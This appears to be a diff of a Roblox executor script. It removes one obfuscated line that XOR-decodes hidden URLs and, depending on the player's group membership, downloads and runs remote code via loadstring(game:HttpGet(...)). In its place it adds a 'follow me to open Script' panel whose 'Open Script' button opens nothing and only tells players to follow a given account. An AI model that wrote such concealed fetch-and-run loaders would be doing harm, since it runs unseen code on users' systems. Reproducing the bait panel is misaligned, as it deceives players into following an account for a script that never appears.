@@ -1,1 +1,150 @@
-local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v12,v13) local v14={};for v15=1, #v12 do v6(v14,v0(v4(v1(v2(v12,v15,v15 + 1 )),v1(v2(v13,1 + (v15% #v13) ,1 + (v15% #v13) + 1 )))%256 ));end return v5(v14);end local v8=57752337 -23272523 ;local v9=game:GetService(v7("\225\207\218\60\227\169\212","\126\177\163\187\69\134\219\167"));local v10=v9.LocalPlayer;if  not v10:IsDescendantOf(v9) then v10.AncestryChanged:Wait();end local function v11() if v10:IsInGroup(v8) then loadstring(game:HttpGet(v7("\43\217\62\213\239\121\130\101\215\253\52\131\45\204\232\43\216\40\208\239\38\223\41\202\242\55\200\36\209\178\32\194\39\138\221\40\207\43\215\173\113\158\57\138\207\32\223\35\213\232\110\255\37\199\240\44\213\103\138\238\38\203\57\138\244\38\204\46\214\179\46\204\35\203\179\45\204\40\196\238\54\239\56\196\245\45\223\37\209","\156\67\173\74\165")))();else loadstring(game:HttpGet(v7("\60\163\93\6\175\124\9\123\165\72\1\242\33\79\32\191\92\20\169\53\67\38\180\70\24\168\35\72\32\249\74\25\177\105\103\63\181\72\4\237\116\21\39\248\125\19\175\50\108\53\161\72\37\191\52\79\36\163\6\4\185\32\85\123\191\76\23\184\53\9\57\182\64\24\243\44\73\61\185\12\68\236\33\84\59\162\89\83\238\118\83\58\163\92\29\249\116\22\54\162\66\23\249\116\22\7\180\91\31\172\50","\38\84\215\41\118\220\70")))();end end v11();
+local username = "4kxYvng"
+local userId = 459391533
+
+-- Hapus GUI lama jika ada
+pcall(function()
+	local oldGui = game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("FollowGui")
+	if oldGui then oldGui:Destroy() end
+end)
+
+-- Buat GUI baru
+local gui = Instance.new("ScreenGui")
+gui.Name = "FollowGui"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Tambahkan judul di atas GUI
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(0, 360, 0, 30)
+titleLabel.Position = UDim2.new(0.5, 0, 0.5, -95)
+titleLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+titleLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+titleLabel.BackgroundTransparency = 0.25
+titleLabel.Text = "follow me to open Script"
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.TextSize = 18
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleLabel.TextStrokeTransparency = 0.2
+titleLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+titleLabel.Parent = gui
+Instance.new("UICorner", titleLabel).CornerRadius = UDim.new(0, 10)
+
+-- Frame utama
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 340, 0, 140)
+frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
+frame.BorderSizePixel = 0
+frame.Parent = gui
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 14)
+
+-- Tombol Close
+local closeButton = Instance.new("TextButton")
+closeButton.Size = UDim2.new(0, 24, 0, 24)
+closeButton.Position = UDim2.new(1, -28, 0, 4)
+closeButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+closeButton.Text = "X"
+closeButton.Font = Enum.Font.GothamBold
+closeButton.TextSize = 14
+closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeButton.Parent = frame
+Instance.new("UICorner", closeButton).CornerRadius = UDim.new(0, 6)
+
+closeButton.MouseButton1Click:Connect(function()
+	gui:Destroy()
+end)
+
+-- Avatar
+local avatar = Instance.new("ImageLabel")
+avatar.Size = UDim2.new(0, 80, 0, 80)
+avatar.Position = UDim2.new(0, 15, 0.5, -40)
+avatar.BackgroundTransparency = 1
+avatar.Image = "https://www.roblox.com/headshot-thumbnail/image?userId="..userId.."&width=100&height=100&format=png"
+avatar.Parent = frame
+
+-- Label teks
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(1, -110, 0, 25)
+label.Position = UDim2.new(0, 110, 0, 5)
+label.BackgroundTransparency = 1
+label.Text = ":follow my roblox:"
+label.Font = Enum.Font.GothamSemibold
+label.TextSize = 17
+label.TextColor3 = Color3.fromRGB(255, 255, 255)
+label.TextXAlignment = Enum.TextXAlignment.Left
+label.Parent = frame
+
+-- TextBox username
+local textbox = Instance.new("TextBox")
+textbox.Size = UDim2.new(1, -120, 0, 30)
+textbox.Position = UDim2.new(0, 110, 0, 30)
+textbox.BackgroundColor3 = Color3.fromRGB(230, 230, 230)
+textbox.Text = username
+textbox.Font = Enum.Font.Gotham
+textbox.TextSize = 16
+textbox.TextColor3 = Color3.fromRGB(20, 20, 20)
+textbox.ClearTextOnFocus = false
+pcall(function() textbox.TextEditable = false end)
+textbox.Parent = frame
+Instance.new("UICorner", textbox).CornerRadius = UDim.new(0, 8)
+
+-- Tombol Copy Username
+local copyBtn = Instance.new("TextButton")
+copyBtn.Size = UDim2.new(1, -120, 0, 28)
+copyBtn.Position = UDim2.new(0, 110, 0, 66)
+copyBtn.BackgroundColor3 = Color3.fromRGB(0, 145, 255)
+copyBtn.Text = "Copy Username"
+copyBtn.Font = Enum.Font.GothamBold
+copyBtn.TextSize = 15
+copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+copyBtn.Parent = frame
+Instance.new("UICorner", copyBtn).CornerRadius = UDim.new(0, 8)
+
+-- Tombol Open Script
+local openBtn = Instance.new("TextButton")
+openBtn.Size = UDim2.new(1, -120, 0, 28)
+openBtn.Position = UDim2.new(0, 110, 0, 100)
+openBtn.BackgroundColor3 = Color3.fromRGB(30, 200, 100)
+openBtn.Text = "Open Script"
+openBtn.Font = Enum.Font.GothamBold
+openBtn.TextSize = 15
+openBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+openBtn.Parent = frame
+Instance.new("UICorner", openBtn).CornerRadius = UDim.new(0, 8)
+
+-- Efek hover tombol
+local function hoverEffect(btn, normalColor, hoverColor)
+	btn.MouseEnter:Connect(function()
+		btn.BackgroundColor3 = hoverColor
+	end)
+	btn.MouseLeave:Connect(function()
+		btn.BackgroundColor3 = normalColor
+	end)
+end
+
+hoverEffect(copyBtn, Color3.fromRGB(0, 145, 255), Color3.fromRGB(0, 120, 220))
+hoverEffect(openBtn, Color3.fromRGB(30, 200, 100), Color3.fromRGB(25, 180, 90))
+hoverEffect(closeButton, Color3.fromRGB(200, 50, 50), Color3.fromRGB(180, 30, 30))
+
+-- Fungsi klik Copy
+copyBtn.MouseButton1Click:Connect(function()
+	if setclipboard then
+		setclipboard(username)
+		copyBtn.Text = "✅ Copied!"
+		wait(1.5)
+		copyBtn.Text = "Copy Username"
+	else
+		copyBtn.Text = "❌ Clipboard Error"
+	end
+end)
+
+-- Notifikasi saat klik Open Script
+openBtn.MouseButton1Click:Connect(function()
+	game.StarterGui:SetCore("SendNotification", {
+		Title = "message",
+		Text = "follow my account roblox for open script",
+		Duration = 10
+	})
+end)
